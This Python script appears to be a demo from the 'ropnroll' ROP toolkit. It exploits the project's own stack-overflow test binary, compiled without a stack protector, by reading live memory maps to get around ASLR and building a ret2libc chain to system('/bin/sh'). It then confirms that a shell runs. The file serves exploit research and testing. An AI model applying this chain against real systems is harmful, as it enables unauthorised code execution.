#!/usr/bin/env python3
"""
Live-fire exploit demo: spawn the real vulnerable test binary, attach to
it, read its *actual* runtime memory map to defeat ASLR (via
/proc/<pid>/maps -- standing in for whatever leak primitive a real exploit
would use to learn the same addresses), rebase ropnroll's gadget pool to
those live addresses, build a ret2libc chain with ropnroll's own solver
(not a hand-picked address), deliver it through the real stack-overflow
vulnerability, and confirm genuine code execution by talking to the
resulting shell.

Honesty note: this sandbox has ASLR disabled system-wide (no root to
change it), so the "defeated" addresses happen to match the static file.
The code path is identical either way -- it reads live addresses from the
live process rather than assuming them -- so this exercises the real
mechanism, just without a randomized target to prove it against.
"""
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from pwn import process, log

from ropnroll.core import loader, scanner
from ropnroll.orchestrate import rebase_from_pid
from ropnroll.solve.callchain import build_call
from ropnroll.solve.pool import GadgetPool

FIXTURES = Path(__file__).resolve().parent.parent / "tests" / "fixtures"
BINARY = str(FIXTURES / "vuln_pie")
OFFSET_TO_RETADDR = 72  # confirmed via objdump: sub $0x40,%rsp (64) + saved rbp (8)


def _ensure_binary_built():
    if Path(BINARY).exists():
        return
    print("[*] vuln_pie not found, compiling it from tests/fixtures/vuln.c...")
    subprocess.run(["gcc", "-pie", "-fno-stack-protector", "-O0", "-o", BINARY,
                     str(FIXTURES / "vuln.c")], check=True)


def main():
    _ensure_binary_built()
    print(f"[*] target: {BINARY}")
    p = process(BINARY)
    pid = p.pid
    print(f"[*] spawned pid {pid}")

    # give it a moment to finish loading its shared objects
    time.sleep(0.2)

    static_bin = loader.load(BINARY)
    static_libc = loader.load("/lib/x86_64-linux-gnu/libc.so.6")

    live_bin = rebase_from_pid(static_bin, pid, name_substr=Path(BINARY).name)
    live_libc = rebase_from_pid(static_libc, pid, name_substr="libc.so.6")
    print(f"[*] live binary base : 0x{live_bin.image_base:x}")
    print(f"[*] live libc   base : 0x{live_libc.image_base:x}")

    print("[*] scanning gadgets against the live-based images...")
    bin_gadgets = scanner.scan_image(live_bin, scanner.ScanOptions(max_insns=4))
    libc_gadgets = scanner.scan_image(live_libc, scanner.ScanOptions(max_insns=6))
    pool = GadgetPool()
    pool.add(live_bin, bin_gadgets)
    pool.add(live_libc, libc_gadgets)

    system_addr = live_libc.symbols["system"]
    binsh = None
    for seg in live_libc.segments:
        if not seg.executable and seg.readable:
            idx = seg.data.find(b"/bin/sh\x00")
            if idx != -1:
                binsh = seg.vaddr + idx
                break
    print(f"[*] live system()  @ 0x{system_addr:x}")
    print(f"[*] live \"/bin/sh\" @ 0x{binsh:x}")

    print("[*] building the call chain with ropnroll's own solver (not hand-picked)...")
    res = build_call(pool, target=system_addr, args=[binsh], bytes_before_chain=OFFSET_TO_RETADDR)
    if not res.ok:
        print("[!] failed to build chain:", res.solve.log)
        sys.exit(1)
    for line in res.solve.log:
        print("   ", line)

    payload = b"A" * OFFSET_TO_RETADDR + res.chain.to_bytes()
    print(f"[*] payload is {len(payload)} bytes ({OFFSET_TO_RETADDR} junk + "
          f"{len(res.chain.to_bytes())} chain)")

    p.recvuntil(b"gimme: ")
    p.send(payload)

    print("[*] sent. probing for a live shell...")
    p.sendline(b"echo ROPNROLL_LIVE_FIRE_$((21+21))")
    try:
        out = p.recvuntil(b"ROPNROLL_LIVE_FIRE_42", timeout=5)
    except Exception:
        out = b""
    if b"ROPNROLL_LIVE_FIRE_42" in out:
        print("[+] SHELL CONFIRMED -- got real code execution via a chain ropnroll built itself")
        p.sendline(b"id")
        print("   ", p.recvline(timeout=3).decode(errors="replace").strip())
        ok = True
    else:
        print("[!] did not get a shell")
        ok = False

    p.close()
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
